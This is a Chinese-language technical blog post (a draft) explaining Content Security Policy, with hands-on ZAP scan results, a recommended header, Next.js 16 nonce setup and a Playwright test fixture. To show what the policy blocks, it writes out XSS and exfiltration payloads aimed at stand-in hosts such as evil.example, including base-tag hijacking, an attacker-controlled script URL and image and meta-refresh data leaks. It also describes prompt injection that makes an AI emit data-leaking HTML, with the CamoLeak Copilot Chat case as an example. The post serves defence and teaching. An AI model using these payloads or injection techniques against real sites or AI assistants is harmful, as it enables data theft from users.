---
title: 前端該懂的 CSP：讓 ZAP 弱掃變乾淨，也擋住 AI 時代的攻擊
authors: [kerwin, claude]
description: CSP 不阻止注入，而是讓注入的內容做不了事。用 ZAP 2.17 實際掃描九種寫法、在 Chromium 實測七種攻擊，整理每個弱掃警告的修法、推薦的完整設定、Next.js 16 的做法，以及它對 AI 攻擊的意義。
pubDate: 2026-11-17
tags: [資安, CSP, Next.js]
series: security
draft: true
coverTitle: "前端該懂的\nCSP"
coverMotif: target
tldr: "CSP 是第二道防線：攻擊者把內容塞進頁面後，它決定那些內容能不能執行、能不能把資料送出去、能不能把網站嵌進別人的頁面。ZAP 的 CSP 檢查只看回應標頭，用 nonce 加 strict-dynamic、補齊 default-src、object-src、base-uri、form-action、frame-ancestors，再加上 X-Content-Type-Options，實測可以讓 CSP 相關警告全部消失。但弱掃通過不代表網站正常：實測一個被 CSP 擋掉所有程式的 Next.js 靜態頁面，ZAP 一樣沒有任何 CSP 警告，所以要用 Playwright 在瀏覽器裡把關。"
faq:
  - question: CSP 是什麼？能防什麼？
    answer: CSP（Content Security Policy）是伺服器用回應標頭告訴瀏覽器「這個頁面只能載入、執行哪些東西」的規則。它不會阻止攻擊者把內容塞進頁面，而是讓塞進來的內容做不了事：注入的腳本不執行、資料送不到外站、網站不能被嵌進別人的頁面。
  - question: ZAP 一直報 CSP 相關的中風險警告，最常見的原因是什麼？
    answer: 實測最常見的四個：完全沒有 CSP（10038-1）、script-src 或 style-src 用了 unsafe-inline（10055-5、10055-6）、沒有定義 default-src 導致很多指令沒有限制（10055-4），以及沒有設定 form-action、frame-ancestors 這兩個不會沿用 default-src 的指令（10055-13）。
  - question: 只放 Content-Security-Policy-Report-Only 可以讓弱掃通過嗎？
    answer: 不行。Report-Only 只回報、不阻擋，實測 ZAP 仍然報「Content Security Policy (CSP) Header Not Set」，另外再加一個資訊等級的提示。Report-Only 適合導入期間收集違規，確認沒問題後要換成正式的 Content-Security-Policy 標頭。
  - question: Next.js 用 nonce 有什麼要注意的？
    answer: 用 nonce 時頁面必須動態渲染。實測照官方範例設定後，靜態產生的頁面 HTML 照常顯示，但 Next.js 的 10 個 script 全被擋下，按鈕點了沒反應。另外 React 在伺服器渲染的 style 屬性會被擋，要加上 style-src-attr 'unsafe-inline'，實測 ZAP 2.17 不會因此報警告。
  - question: CSP 對 AI 相關的攻擊有用嗎？
    answer: 有兩種用處。第一，AI 讓找漏洞變得更快更便宜，應該假設 XSS 遲早會被找到，CSP 能讓找到的漏洞做不了事。第二，網站把 AI 產生的內容顯示在頁面上時，提示注入可能讓 AI 輸出惡意的 HTML 或圖片網址來外洩資料；OWASP 的 LLM Top 10 建議用嚴格的 CSP 降低這類風險。但 CSP 擋不住所有外洩管道，例如跳轉到外站。
  - question: CSP 設定好了，還需要做什麼？
    answer: CSP 是第二道防線，第一道還是輸出跳脫、不把使用者內容塞進 innerHTML。另外要用瀏覽器測試確認 CSP 沒有擋到自己的功能，因為弱掃不會執行頁面，看不出網站已經壞掉。
---

弱點掃描報告裡，CSP 相關的警告幾乎每次都會出現，而且常常是「中風險」。很多人的處理方式是上網找一段 CSP 貼上，警告消失就算了，或者整頁壞掉再拿掉。

這篇從前端的角度把 CSP 講清楚：它到底擋什麼、弱掃在檢查什麼、怎麼設定才能讓警告消失又不弄壞網站，以及在 AI 能大量找漏洞的現在，它為什麼更重要。

文中的結果都是實測的：

- **弱掃**：ZAP 2.17.0（內建的被動掃描規則 pscanrules release 70），只做被動掃描，不對網站發動攻擊。
- **瀏覽器**：Chromium 153，用 Playwright 操作。
- **框架**：Next.js 16.4.6。

## CSP 是什麼

CSP（Content Security Policy，內容安全政策）是伺服器用回應標頭告訴瀏覽器：**這個頁面只能載入、執行哪些東西**。

```http
Content-Security-Policy: default-src 'self'; img-src 'self' data:; frame-ancestors 'none'
```

規則由一條條「指令」組成，用分號隔開：

| 指令 | 管什麼 |
| --- | --- |
| `default-src` | 預設值，下面的 `*-src` 沒寫時沿用它 |
| `script-src` | JavaScript 能從哪裡來、行內程式能不能執行 |
| `style-src` | CSS 能從哪裡來 |
| `img-src`、`connect-src`、`font-src` | 圖片、fetch 與 WebSocket、字型 |
| `object-src` | `<object>`、`<embed>` 這類外掛 |
| `base-uri` | 頁面能不能用 `<base>` 改變相對路徑的基準 |
| `form-action` | 表單能送到哪裡 |
| `frame-ancestors` | 誰可以把這個頁面嵌進 iframe |

**最容易漏掉的是最後三個**：`base-uri`、`form-action`、`frame-ancestors` 不會沿用 `default-src`，沒寫就是沒有限制。

常見的值：

| 值 | 意思 |
| --- | --- |
| `'self'` | 同一個網站 |
| `'none'` | 全部禁止 |
| `'nonce-亂數'` | 帶有相同 `nonce` 屬性的 `<script>`、`<style>` 才能執行 |
| `'strict-dynamic'` | 被允許的腳本自己再載入的腳本，也一併允許 |
| `'unsafe-inline'` | 允許行內程式，包括 `onclick` 這類屬性。**等於關掉 CSP 最重要的保護** |

## CSP 擋的是哪一步

![攻擊者注入內容之後的三個步驟，以及 CSP 在每一步擋住什麼。前提：攻擊者已經把內容塞進頁面，例如沒跳脫的輸出、innerHTML、AI 產生的 HTML，第一道防線已經失守。第一步，執行程式：注入 script、行內事件 onerror、載入外部惡意腳本、用 base 劫持路徑，對應的 CSP 指令是 script-src、base-uri、object-src。第二步，把資料送出去：用 img 把資料帶到外站、fetch 到外站、表單送到外站，這些不用執行程式也做得到，對應的指令是 img-src、connect-src、form-action。第三步，騙使用者操作：把你的網站嵌進別人的頁面誘導點擊，也就是點擊劫持，對應的指令是 frame-ancestors。CSP 擋不住的是跳轉到外站：注入 meta http-equiv refresh，實測最完整的設定也照樣跳轉、把資料帶出去。CSP 是第二道防線，不阻止注入，而是讓注入的內容做不了事；第一道防線還是輸出跳脫，以及 Trusted Types。](../../assets/articles/csp-basics/attack-chain.svg)

我寫了一個「搜尋結果頁」，故意把網址的 `?q=` 原樣輸出到頁面上，模擬一個 XSS 漏洞。同一個頁面配上不同的 CSP，在 Chromium 裡送入七種攻擊：

| 攻擊 | 沒有 CSP | 常見寫法 | 只有 nonce | 完整設定 |
| --- | --- | --- | --- | --- |
| 注入 `<script>` | 執行 | 執行 | 擋下 | 擋下 |
| 行內事件 `onerror` | 執行 | 執行 | 擋下 | 擋下 |
| 載入外部惡意腳本 | 執行 | 擋下 | 擋下 | 擋下 |
| 用 `<base>` 劫持相對路徑 | 執行 | 擋下 | 擋下 | 擋下 |
| `<img>` 把資料帶到外站 | 送出 | 擋下 | **送出** | 擋下 |
| 表單送到外站 | 送出 | 送出 | 送出 | 擋下 |
| `<meta refresh>` 跳轉到外站 | 跳轉 | 跳轉 | 跳轉 | **跳轉** |

四種寫法的內容：

- **常見寫法**：`default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'`，很多專案為了不弄壞網站採用這種。
- **只有 nonce**：`script-src 'nonce-亂數' 'strict-dynamic'; object-src 'none'; base-uri 'none'`，這是常被引用的「嚴格 CSP」最小版本。
- **完整設定**：後面「推薦的寫法」一節的設定。

幾個值得注意的結果：

- **`'unsafe-inline'` 讓 CSP 對 XSS 幾乎沒用**。常見寫法擋得住外部腳本，但注入 `<script>` 和 `onerror` 都照樣執行，而這正是 XSS 最常見的形式。
- **只有 nonce 擋得住執行，擋不住外洩**。`<img src="外站?d=資料">` 不需要執行任何程式，只要沒有限制 `img-src`，資料照樣送出去。
- **CSP 擋不住跳轉**。注入 `<meta http-equiv="refresh" content="0;url=外站?d=資料">`，連完整設定都照樣跳過去。這就是為什麼 CSP 只是第二道防線。

## ZAP 在檢查什麼

ZAP 的 CSP 檢查來自兩條被動掃描規則：

- **10038**：有沒有 CSP。
- **10055**：CSP 寫得好不好。

這兩條都只**讀回應標頭和 `<meta>`，不執行頁面**。這點後面會很重要。

我讀了這兩條規則的原始碼，再用 ZAP 2.17.0 分別掃描九種寫法。每種寫法單獨掃描，因為一起掃的時候，同一個警告的回報數量有上限，有些頁面的警告會沒列出來。

### 九種寫法的實測結果

| 寫法 | ZAP 的 CSP 相關警告 |
| --- | --- |
| 沒有 CSP | 10038-1 沒有 CSP、10020-1 沒有防點擊劫持 |
| 只有 Report-Only | 10038-1 沒有 CSP、10020-1、10038-3（資訊）發現 Report-Only |
| 常見寫法（`'unsafe-inline'`） | 10055-5 script-src unsafe-inline、10055-6 style-src unsafe-inline、10055-13 缺少無預設值的指令、10020-1 |
| 只有 nonce | 10055-4 萬用字元、10055-6、10055-13、10020-1 |
| 只有 nonce，加相容舊瀏覽器的 `'unsafe-inline'` | 同上，**沒有** script-src unsafe-inline |
| 用 `<meta>` 設定 | 10055-11 meta 不能用的指令、10055-13、10020-1 |
| 完整設定，但 `style-src` 用 `'unsafe-inline'` | 10055-6 |
| **完整設定** | **沒有** |
| 完整設定加 `style-src-attr 'unsafe-inline'` | **沒有** |

所有寫法另外都有 10021「缺少 X-Content-Type-Options」，這是另一個標頭，加上 `X-Content-Type-Options: nosniff` 後實測就消失了。最後只剩一個「資訊」等級的 10109（偵測到現代網頁應用程式），那不是漏洞。

### 每個警告怎麼修

| 警告 | 意思 | 怎麼修 |
| --- | --- | --- |
| 10038-1 Content Security Policy (CSP) Header Not Set | HTML 回應沒有 CSP | 加上 `Content-Security-Policy` 標頭。Report-Only 不算 |
| 10055-5 script-src unsafe-inline | 允許行內程式 | 改用 nonce。同時有 nonce 時，瀏覽器會忽略 `'unsafe-inline'`，ZAP 也知道，不會報 |
| 10055-6 style-src unsafe-inline | 允許行內樣式 | `<style>` 改用 nonce；`style=""` 屬性見後面 |
| 10055-4 Wildcard Directive | 某些指令沒定義或太寬鬆 | 加上 `default-src 'self'`，需要外部資源的再個別放寬 |
| 10055-13 Failure to Define Directive with No Fallback | 沒寫不會沿用 `default-src` 的指令 | 加上 `form-action`、`frame-ancestors` |
| 10055-11 Meta Policy Invalid Directive | `<meta>` 裡寫了不能用的指令 | `frame-ancestors`、`sandbox` 只能放在標頭 |
| 10020-1 Missing Anti-clickjacking Header | 沒有防止被嵌入 | `frame-ancestors 'none'`（或 `'self'`），不一定要另外加 `X-Frame-Options` |

兩個細節：

- **只有 nonce 的「嚴格 CSP」過不了 ZAP**。它沒有 `default-src`，圖片、連線、字型等指令都沒有限制，所以報 10055-4；這也就是上一節圖片外洩擋不住的原因。
- **ZAP 2.17 不會檢查 `base-uri`**。它內建的規則版本只把 `form-action`、`frame-ancestors` 當成「沒有預設值的指令」，我讀到的開發中原始碼已經把 `base-uri` 也加進去。實測沒寫 `base-uri` 的寫法，ZAP 2.17 並沒有針對它報警，但下一節會看到它很重要。

## 推薦的寫法

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{每次請求產生的亂數}' 'strict-dynamic';
  style-src 'self' 'nonce-{同一個亂數}';
  style-src-attr 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self';
  font-src 'self';
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none'
X-Content-Type-Options: nosniff
```

實際送出時是一行，這裡為了閱讀分行。各部分的理由：

| 指令 | 理由 |
| --- | --- |
| `default-src 'self'` | 沒寫到的資源類型一律只能來自自己的網站，也讓 ZAP 不報 10055-4 |
| `script-src 'nonce-…' 'strict-dynamic'` | 只有伺服器標記過的腳本能執行，注入的腳本拿不到 nonce |
| `style-src 'self' 'nonce-…'` | `<style>` 一樣用 nonce |
| `style-src-attr 'unsafe-inline'` | 允許 `style=""` 屬性，見下方說明 |
| `img-src`、`connect-src` | 擋住把資料送到外站，這是 AI 相關攻擊的重點 |
| `object-src 'none'` | 禁止舊式外掛 |
| `base-uri 'none'` | 見下方實測 |
| `form-action 'self'` | 表單只能送回自己的網站 |
| `frame-ancestors 'none'` | 不能被嵌入，防點擊劫持 |

nonce 必須**每次請求都重新產生**、而且無法預測，否則攻擊者猜得到就沒有意義。

需要載入外部服務（地圖、分析工具、CDN）時，在對應的指令加上它的網域，例如 `img-src 'self' data: https://maps.example.com`。不要為了省事改成 `*`。

### 為什麼一定要 `base-uri`

實測一個沒寫 `base-uri`、只有 nonce 的設定：攻擊者注入 `<base href="https://evil.example/">` 之後，頁面後面一個**帶有正確 nonce** 的 `<script src="/static/late.js">`，被改成從 `https://evil.example/static/late.js` 載入並執行。

nonce 證明的是「這個 `<script>` 標籤是伺服器產生的」，不保證它載入的內容。`base-uri 'none'` 擋掉之後，同一個攻擊就失效了。這是 ZAP 2.17 不會提醒你的。

### `'strict-dynamic'` 的代價

`'strict-dynamic'` 讓「有 nonce 的腳本自己再載入的腳本」也被允許，這是現代框架需要的，因為它們會動態載入程式碼。實測 Next.js 的 10 個 script 都靠這個運作。

但它也有代價。實測頁面上有一段常見的寫法：依網址參數載入外掛腳本。

```js
const s = document.createElement('script')
s.src = new URLSearchParams(location.search).get('cdn')  // 攻擊者可以控制
document.body.append(s)
```

| 設定 | `?cdn=https://evil.example/plugin.js` |
| --- | --- |
| 常見寫法（`script-src 'self'`） | 擋下 |
| 完整設定（`'strict-dynamic'`） | **執行** |
| 完整設定加 Trusted Types | 擋下，程式丟出 `TypeError` |

因為這段程式本身有 nonce，它載入的腳本就被信任了。解法是 **Trusted Types**：在 CSP 加上 `require-trusted-types-for 'script'`，瀏覽器就不允許直接把字串指定給 `script.src`、`innerHTML` 這類危險的屬性，必須經過你定義的檢查函式。實測 `innerHTML` 塞字串也一樣被擋下。

Trusted Types 在 MDN 標示為 Baseline 2026，從 2026 年 2 月起，主流瀏覽器的最新版都支援。它會讓所有直接寫入 `innerHTML` 的程式出錯，導入前要先用 Report-Only 盤點。這篇不展開細節。

### React 的 `style` 屬性會被擋

`style-src` 沒有 `'unsafe-inline'` 時，HTML 裡的 `style=""` 屬性會被擋下，而 nonce 只能加在 `<style>` 標籤上，加不到屬性。

| 設定 | `<div style="color: red">` | 用 JavaScript 設定 `el.style.color` |
| --- | --- | --- |
| `style-src 'self' 'nonce-…'` | 被擋，變成預設的黑色 | 正常 |
| 再加 `style-src-attr 'unsafe-inline'` | 正常 | 正常 |

React 在伺服器渲染時，`style={{ color: 'red' }}` 會輸出成 HTML 的 `style` 屬性，所以會被擋。`style-src-attr 'unsafe-inline'` 只放寬「屬性」，`<style>` 標籤還是要 nonce，實測 ZAP 2.17 也不會因此報 10055-6。

風險是攻擊者可以注入帶有 `style` 屬性的元素，做出覆蓋畫面的假按鈕這類視覺上的欺騙，但無法藉此執行程式。如果專案能把 `style` 屬性全部改成 class，就不需要這一條。

## AI 時代的攻擊，CSP 有什麼用

### AI 讓找漏洞變得便宜

AI 自動化的滲透測試已經能在真實的漏洞獎勵平台上大量回報漏洞。例如 XBOW 的 AI 在 2025 年 6 月登上 HackerOne 美國排行榜第一，依其公司公布的數字，兩年內回報了約 1,060 個漏洞，類型包括 XSS、SQL 注入、SSRF 等。這些數字來自廠商本身。

對前端的意思是：**應該假設 XSS 遲早會被找到**。以前一個不起眼的輸出沒跳脫，可能幾年都沒人發現；現在被 AI 掃到的機率高得多。CSP 的價值在於，漏洞被找到時，注入的內容還是做不了事。

### 網站顯示 AI 產生的內容

越來越多網站把 AI 的回答直接顯示在頁面上：客服機器人、摘要、自動產生的說明。這帶來一種新的注入來源：

1. 攻擊者把指令藏在 AI 會讀到的地方，例如網頁、文件、留言（提示注入）。
2. AI 照著指令，在回答裡輸出惡意的 HTML，或是一張網址帶著機密資料的圖片。
3. 網站把回答渲染出來，瀏覽器就執行了程式，或把資料送到攻擊者的伺服器。

OWASP 的 LLM 應用程式 Top 10（2025）把這類問題列為 LLM05「不當的輸出處理」，對策包括對 AI 的輸出做編碼，以及「使用嚴格的 CSP，降低 AI 產生內容造成 XSS 的風險」。

對照前面的實測，CSP 在這裡的作用是：

| AI 輸出的內容 | 擋住它的指令 |
| --- | --- |
| `<script>`、`<img onerror>` | `script-src` 用 nonce |
| `<img src="外站?d=機密">` | `img-src` |
| 呼叫外站 API 的程式 | `script-src` 擋執行、`connect-src` 擋連線 |
| 送到外站的表單 | `form-action` |

### 白名單也可能被利用

2025 年的 CamoLeak 是個值得記住的例子。研究人員在 GitHub 的 Pull Request 裡藏了看不見的指令，讓 Copilot Chat 讀取私有儲存庫的機密，再把機密一個字元一個字元地轉成**GitHub 自己允許的圖片網址**輸出。

GitHub 的 CSP 只允許從自家的圖片代理載入圖片，但研究人員事先為每個字元產生了合法的代理網址，攻擊者從圖片被請求的順序就能還原機密。GitHub 的處理方式是在 Copilot Chat 停用圖片渲染。

教訓是：**CSP 白名單裡的每個網域，都可能變成外洩管道**。顯示 AI 產生的內容時，最保險的做法是不渲染圖片和連結，或只允許你能完全掌控的來源。

## Next.js 16 的做法

Next.js 官方文件提供了用 `proxy.ts`（Next.js 16 以前叫 `middleware.ts`）產生 nonce 的範例：每次請求產生新的 nonce，同時放進請求標頭和回應標頭。Next.js 渲染時會從請求的 CSP 標頭讀出 nonce，自動加到自己的 script 上。

我照官方範例建了一個網站，實測三件事。

### 靜態頁面會整頁壞掉

| 頁面 | 結果 |
| --- | --- |
| 動態渲染（呼叫 `connection()`） | 10 個 script 都有 nonce，按鈕正常 |
| 靜態產生（建置時產生 HTML） | 10 個 script 都沒有 nonce、全部被擋，**按鈕點了沒反應** |

靜態頁面是在建置時產生的，那時還沒有請求，自然沒有 nonce；但 `proxy.ts` 每次都送出一個新的 nonce，兩邊對不上。最麻煩的是，HTML 照常顯示，畫面看起來完全正常，只有點下去才知道壞了。

官方文件寫明：用 nonce 時**所有頁面都必須動態渲染**，靜態產生、ISR、CDN 快取都會失去作用，Partial Prerendering 也不相容。每個頁面都要呼叫 `connection()`（或其他會讓頁面變成動態的 API）。

不想放棄靜態產生的話，官方提供實驗性的 SRI（以檔案雜湊代替 nonce），或是不用 nonce、改用 `'unsafe-inline'`。後者過不了 ZAP 的 10055-5，這兩種我都沒有實測。

### React 的 `style` 屬性

官方範例的 `style-src 'self' 'nonce-…'` 會擋掉 `style={{ … }}`，實測頁面上的紅字變成黑字，console 出現 CSP 錯誤。加上 `style-src-attr 'unsafe-inline'` 後恢復正常。

### ZAP 的結果

官方範例加上 `style-src-attr` 之後，ZAP 對動態頁面的 CSP 相關警告是零，只剩兩個跟 CSP 無關的：

- **10021 缺少 X-Content-Type-Options**：加上 `nosniff`。
- **10037 X-Powered-By 洩漏伺服器資訊**：Next.js 預設會送出 `X-Powered-By: Next.js`，在 `next.config` 設定 `poweredByHeader: false` 關掉。

官方範例的 `base-uri 'self'`，ZAP 也接受。如果沒有使用 `<base>` 的需求，`'none'` 更嚴格。

## 導入步驟：先回報，再強制

![導入 CSP 的四個步驟。第一步只回報：用 Report-Only 標頭，不擋只記錄，這時 ZAP 仍會報沒有 CSP。第二步收集：跑過所有頁面看違規報告，用 Playwright 走過主要流程。第三步修正：加 nonce、移除行內事件和 style，然後回到第二步，直到沒有違規。第四步強制：換成正式的 CSP 標頭，弱掃這時才會變乾淨。下方說明：弱掃通過不代表網站沒被 CSP 弄壞。ZAP 只讀回應標頭、不執行頁面，實測一個被 CSP 擋掉所有程式、按鈕點不動的頁面，ZAP 的結果跟正常的頁面一模一樣。每次交付前，用 Playwright 走過主要流程，有 CSP 違規就讓測試失敗。](../../assets/articles/csp-basics/rollout.svg)

直接上正式的 CSP 很容易弄壞網站。建議先用 `Content-Security-Policy-Report-Only`：瀏覽器照規則檢查、回報違規，但不會擋。

```http
Content-Security-Policy-Report-Only: default-src 'self'; …; report-uri /csp-report
```

實測注入的腳本在 Report-Only 下照樣執行，但伺服器收到了兩筆回報：一筆是注入的腳本（`script-src-elem`），另一筆是頁面原本的 `style` 屬性（`style-src-attr`）。第二筆正是「如果強制執行，你的網站會壞的地方」。

`report-uri` 已被規格標示為淘汰，新的寫法是 `report-to` 搭配 `Reporting-Endpoints` 標頭；兩個可以同時寫。這次只實測了 `report-uri`。

### 弱掃通過，不代表網站沒壞

前面那個被 CSP 擋掉所有程式的 Next.js 靜態頁面，我也用 ZAP 掃了一次。**結果跟正常的動態頁面一模一樣**，沒有任何 CSP 相關的警告。

ZAP 只讀回應標頭，標頭寫得好，它就沒意見；頁面裡的程式有沒有被擋，它不會知道。所以交付前除了弱掃，還要在真的瀏覽器裡跑過主要流程。

用 Playwright 的話，可以寫一個自動套用的 fixture，任何測試只要頁面出現 CSP 違規就失敗：

```ts
// tests/fixtures.ts
import { test as base, expect } from '@playwright/test'

export const test = base.extend<{ cspViolations: string[] }>({
  cspViolations: [
    async ({ page }, use) => {
      const violations: string[] = []
      page.on('console', (msg) => {
        if (msg.type() === 'error' && msg.text().includes('Content Security Policy')) {
          violations.push(msg.text())
        }
      })
      await use(violations)
      expect(violations, '頁面有 CSP 違規').toEqual([])
    },
    { auto: true }, // 每個測試自動套用
  ],
})
export { expect }
```

測試檔改從這個檔案匯入 `test`，原本的測試不用改。實測對壞掉的靜態頁面，測試失敗並列出 10 筆 CSP 違規；正常的動態頁面則通過。

這裡聽的是 console 而不是頁面的 `securitypolicyviolation` 事件，因為頁面自己的程式被擋時，可能根本沒機會執行監聽的程式。console 的訊息文字是 Chromium 的格式，其他瀏覽器可能不同。

## 檢查清單

- 送出 `Content-Security-Policy` 標頭，不是只有 Report-Only
- `script-src` 用 nonce，沒有 `'unsafe-inline'`、`'unsafe-eval'`
- 有 `default-src 'self'`
- 有 `object-src 'none'`、`base-uri 'none'`（或 `'self'`）
- 有 `form-action`、`frame-ancestors`
- `img-src`、`connect-src` 沒有 `*`
- nonce 每次請求重新產生
- 另外送出 `X-Content-Type-Options: nosniff`
- Next.js：用 nonce 的頁面都是動態渲染；關掉 `X-Powered-By`
- 顯示 AI 產生的內容時，不渲染外部圖片，或只允許完全可控的來源
- Playwright 測試會在 CSP 違規時失敗

## 這次實測了什麼

- ZAP 2.17.0（pscanrules release 70）被動掃描：九種 CSP 寫法、Next.js 16.4.6 的動態與靜態頁面
- Chromium 153：七種注入與外洩攻擊在四種設定下的結果
- `base-uri`、`'strict-dynamic'` 搭配危險寫法、Trusted Types、`style-src-attr`
- Report-Only 與 `report-uri` 回報、`frame-ancestors` 防止被嵌入
- Next.js 16.4.6 照官方範例設定 nonce：動態頁面正常、靜態頁面失去互動
- Playwright fixture 在 CSP 違規時讓測試失敗

沒有測的：

- Firefox、Safari
- `report-to` 與 Reporting API
- Next.js 的實驗性 SRI，以及第三方服務（Google Tag Manager 等）的設定
- ZAP 的主動掃描（只做了被動掃描）
- 其他弱掃工具（例如 Burp Suite、Nessus）的判斷標準

## 一句話複習

**CSP 不阻止注入，而是讓注入的內容做不了事**。用 nonce 取代 `'unsafe-inline'`，補齊 `default-src`、`object-src`、`base-uri`、`form-action`、`frame-ancestors`，弱掃就會變乾淨；但弱掃不執行頁面，CSP 有沒有弄壞自己的網站，要靠瀏覽器測試把關。

參考資料：[OWASP LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)、[ZAP 被動掃描規則](https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules)、[ZAP CSP 規則 10055](https://zaproxy.org/docs/alerts/10055)、[MDN：Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)、[The Register：CamoLeak](https://www.theregister.com/2025/10/09/github_copilot_chat_vulnerability/)、[XBOW：We ran 1,060 autonomous attacks](https://xbow.com/blog/we-ran-1060-autonomous-attacks)。
